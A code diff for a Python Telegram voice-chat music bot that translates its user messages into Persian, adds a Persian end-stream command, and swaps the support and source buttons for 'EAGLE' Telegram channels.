         call_status = await get_call_status(chat_id)
         if call_status == "IDLE" or call_status == "NOTHING":
-            return await bot.send_message(chat_id, "**➥ Nᴏᴛʜɪɴɢ sᴛʀᴇᴀᴍɪɴɢ...**")
+            return await bot.send_message(chat_id, "**➥ هیچ پخش جاری وجود ندارد...**")
         elif call_status == "PLAYING" or call_status == "PAUSED":
             stickers = [
                 "🌹",
@@ -1361,13 +1388,13 @@ async def skip_and_change_stream(client, message):
                 pass
     except Exception as e:
         try:
-            await bot.send_message(chat_id, f"**🚫 Sᴋɪᴘ Eʀʀᴏʀ:** `{e}`")
+            await bot.send_message(chat_id, f"**🚫 خطا در رد کردن آهنگ:** `{e}`")
         except Exception:
-            LOGGER.info(f"🚫 Skip Error: {e}")
+            LOGGER.info(f"🚫 خطای رد کردن آهنگ: {e}")
             return
 
 
-@bot.on_message(cdx(["end", "vend"]) & ~pyrofl.private)
+@bot.on_message(cdx(["end", "اتمام","vend"]) & ~pyrofl.private)
 async def stop_stream_and_leave_vc(client, message):
     chat_id = message.chat.id
     try:
@@ -1377,21 +1404,20 @@ async def stop_stream_and_leave_vc(client, message):
     try:
         call_status = await get_call_status(chat_id)
         if call_status == "NOTHING":
-            return await message.reply_text("**➥ Nᴏᴛʜɪɴɢ sᴛʀᴇᴀᴍɪɴɢ**")
+            return await message.reply_text("**➥ هیچ پخش جاری وجود ندارد**")
         elif call_status == "IDLE":
-            return await message.reply_text("**➥ Sᴜᴄᴄᴇssғᴜʟʟʏ Lᴇғᴛ Fʀᴏᴍ VC**")
+            return await message.reply_text("**➥ با موفقیت از چت صوتی خارج شد**")
         elif call_status == "PLAYING" or call_status == "PAUSED":
             await close_stream(chat_id)
-            return await message.reply_text("**➥ Sᴛᴏᴘᴘᴇᴅ Sᴛʀᴇᴀᴍ & Lᴇғᴛ\nFʀᴏᴍ VC...**")
+            return await message.reply_text("**➥ پخش متوقف شد و از چت صوتی خارج شد...**")
         else:
             return
     except Exception as e:
         try:
-            await bot.send_message(chat_id, f"**🚫 Sᴛʀᴇᴀᴍ Eᴇɴᴅ Eʀʀᴏʀ:** `{e}`")
+            await bot.send_message(chat_id, f"**🚫 خطا در اتمام پخش:** `{e}`")
         except Exception:
-            LOGGER.info(f"🚫 Stream End Error: {e}")
+            LOGGER.info(f"🚫 خطای اتمام پخش: {e}")
             return
-
 
 @call.on_update(pytgfl.chat_update(ChatUpdate.Status.CLOSED_VOICE_CHAT))
 @call.on_update(pytgfl.chat_update(ChatUpdate.Status.KICKED))
@@ -1433,17 +1459,17 @@ async def git_repo_link(client, message):
     [
         [
             InlineKeyboardButton(
-                text="˹ sᴜᴘᴘᴏꝛᴛ ˼",
-                url="https://t.me/+OL6jdTL7JAJjYzVl"
+                text="˹ پشتیبانی ˼",
+                url="https://t.me/EAGLE_SUPPORT" 
             ),
             InlineKeyboardButton(
-                text="˹ sᴏᴜꝛᴄᴇ ˼",
-                url="https://github.com/BABY-MUSIC/SANATANI_MxPLAYER"
+                text="˹ مالک ˼",
+                url="https://t.me/EAGLE_SOURCE"
             ),
         ],
         [
             InlineKeyboardButton(
-                text="↺ ᴄʟᴏsᴇ ↻",
+                text="⌾ 𝙀𝘼𝙂𝙇𝙀 𝙏𝙀𝘼𝙈 ⌾",
                 callback_data="force_close"
             ),
         ]
@@ -1520,13 +1546,13 @@ async def git_repo_link(client, message):
     [
         [
             InlineKeyboardButton(
-                text="˹ ᴛᴀᴘ ᴛᴏ sᴇᴇ sᴛᴀᴛs ˼",
+                text="˹ نمایش آمار ˼",
                 callback_data="check_stats"
             ),
         ],
         [
             InlineKeyboardButton(
-                text="↺ ᴄʟᴏsᴇ ↻",
+                text="⌾ 𝙀𝘼𝙂𝙇𝙀 𝙏𝙀𝘼𝙈 ⌾",
                 callback_data="force_close"
             ),
         ]
